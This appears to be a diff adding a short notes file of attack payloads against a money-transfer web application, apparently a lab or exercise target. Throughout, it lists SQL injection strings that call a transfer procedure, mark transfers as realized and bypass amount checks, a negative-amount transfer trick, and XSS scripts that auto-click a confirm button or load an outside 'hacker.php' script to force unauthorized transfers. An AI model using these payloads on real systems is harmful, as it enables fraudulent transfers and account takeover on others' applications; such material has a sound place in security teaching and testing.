@@ -1,0 +1,31 @@
+
+SQL injection
+max'; call transfer('admin','max','title',1000);select * from users where username='max
+
+XSS
+
+Examles:
+	username:
+			max'; <script>alert("Hello!");</script>
+	
+1--->		alek' OR amount < '100
+
+2--->		max'; UPDATE transfers SET `realized` = 1 WHERE sender = 'max
+
+
+
+
+Make transfer like:
+	receiver : admin
+	amount: -1000
+	title : **option**
+
+**options**
+
+		"><script>window.onload=function{
+		document.getElementById("confirm").click();}</script> <a href="
+
+2--->	<script>window.onload=function(){ document.getElementById('confirm').click();}</script>
+
+3--->	<script src='hacker.php'></script>
+	
